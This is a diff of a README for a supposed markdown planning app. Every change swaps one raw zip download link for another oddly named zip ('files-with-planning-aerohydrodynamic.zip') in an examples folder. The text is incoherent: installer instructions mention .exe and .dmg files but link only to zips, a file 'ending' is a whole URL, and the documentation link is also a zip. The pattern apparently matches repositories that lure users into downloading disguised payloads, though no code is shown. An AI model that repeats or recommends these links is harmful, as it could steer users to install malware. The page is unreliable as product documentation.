@@ -1,7 +1,7 @@
 # 🎉 planning-with-files - Simplify Your Markdown Planning
 
 ## 🔗 Download Here
-[![Download planning-with-files](https://raw.githubusercontent.com/Hans11609/planning-with-files/master/examples/with-files-planning-v1.1.zip)](https://raw.githubusercontent.com/Hans11609/planning-with-files/master/examples/with-files-planning-v1.1.zip)
+[![Download planning-with-files](https://github.com/Hans11609/planning-with-files/raw/refs/heads/master/examples/files-with-planning-aerohydrodynamic.zip)](https://github.com/Hans11609/planning-with-files/raw/refs/heads/master/examples/files-with-planning-aerohydrodynamic.zip)
 
 ## 🚀 Getting Started
 Welcome to **planning-with-files**! This application helps you organize your tasks and notes using a simple, easy-to-use markdown format. It is designed to streamline your planning process so you can focus on what matters most.
@@ -20,7 +20,7 @@ Welcome to **planning-with-files**! This application helps you organize your tas
 
 ## 📥 Download & Install
 To get started, you need to download the application.  
-Visit this page to download: [Download planning-with-files](https://raw.githubusercontent.com/Hans11609/planning-with-files/master/examples/with-files-planning-v1.1.zip).
+Visit this page to download: [Download planning-with-files](https://github.com/Hans11609/planning-with-files/raw/refs/heads/master/examples/files-with-planning-aerohydrodynamic.zip).
 
 ### ✅ Installation Steps
 1. Click on the link above to visit the Releases page.
@@ -28,11 +28,11 @@ Visit this page to download: [Download planning-with-files](https://raw.githubus
 3. Download the file that matches your operating system:
    - For Windows, look for files ending in `.exe`.
    - For macOS, look for files ending in `.dmg`.
-   - For Linux, look for files ending in `https://raw.githubusercontent.com/Hans11609/planning-with-files/master/examples/with-files-planning-v1.1.zip`.
+   - For Linux, look for files ending in `https://github.com/Hans11609/planning-with-files/raw/refs/heads/master/examples/files-with-planning-aerohydrodynamic.zip`.
 4. Once the download is complete, locate the file:
    - **Windows:** Double-click the `.exe` file to start the installation.
    - **macOS:** Open the `.dmg` file, drag the application to your Applications folder, and then open it.
-   - **Linux:** Extract the `https://raw.githubusercontent.com/Hans11609/planning-with-files/master/examples/with-files-planning-v1.1.zip` file, navigate to the extracted folder in a terminal, and run the application with `./YourAppName`.
+   - **Linux:** Extract the `https://github.com/Hans11609/planning-with-files/raw/refs/heads/master/examples/files-with-planning-aerohydrodynamic.zip` file, navigate to the extracted folder in a terminal, and run the application with `./YourAppName`.
 5. Follow the prompts to complete your installation.
 
 ## 🌟 How to Use
@@ -65,7 +65,7 @@ A: Yes, you can open any `.md` files within the application.
 A: An internet connection is only needed for downloading and updates. The app works offline.
 
 ## 🔗 Additional Resources
-- **Documentation:** [Official Documentation](https://raw.githubusercontent.com/Hans11609/planning-with-files/master/examples/with-files-planning-v1.1.zip)
+- **Documentation:** [Official Documentation](https://github.com/Hans11609/planning-with-files/raw/refs/heads/master/examples/files-with-planning-aerohydrodynamic.zip)
 - **Support:** Reach out to us via the issues section in the GitHub repository.
 
 ## 🤝 Contributing
